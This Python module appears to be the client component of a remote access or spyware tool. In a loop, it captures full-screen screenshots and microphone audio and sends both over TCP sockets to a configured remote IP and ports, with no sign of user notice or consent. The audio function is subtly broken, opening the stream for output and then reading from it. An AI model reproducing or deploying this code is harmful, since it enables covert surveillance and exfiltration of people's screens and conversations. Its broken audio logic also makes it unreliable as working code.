import socket
import time
import pyautogui
import pyaudio
from lib import client, comm, config


# =====================
# Screen Capture Sender
# =====================
def video_shell(server: socket.socket):
    try:
        while True:
            image_bytes = pyautogui.screenshot().tobytes()  # Screenshot full screen
            comm.sendall(server, image_bytes, config.CLIENT_VERBOSE)
            time.sleep(3)  # reduce CPU usage
    except Exception as e:
        print("[VIDEO_CLIENT_ERROR]", e)


# =====================
# Microphone Audio Sender
# =====================
def audio_shell(server: socket.socket):
    p = pyaudio.PyAudio()
    stream = p.open(
        format=pyaudio.paInt16,
        channels=config.CHANNELS,
        rate=config.RATE,
        output=True,
        frames_per_buffer=config.CHUNK,
    )
    try:
        while True:
            data = stream.read(1024)
            comm.sendall(server, data, config.CLIENT_VERBOSE)
            time.sleep(3)
    except Exception as e:
        print("[AUDIO_CLIENT_ERROR]", e)
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()


def connect_video_server():
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(video_server, (config.IP, config.VDO_PORT), video_shell, 5)


def connect_audio_server():
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect_server(audio_server, (config.IP, config.AUD_PORT), audio_shell, 5)
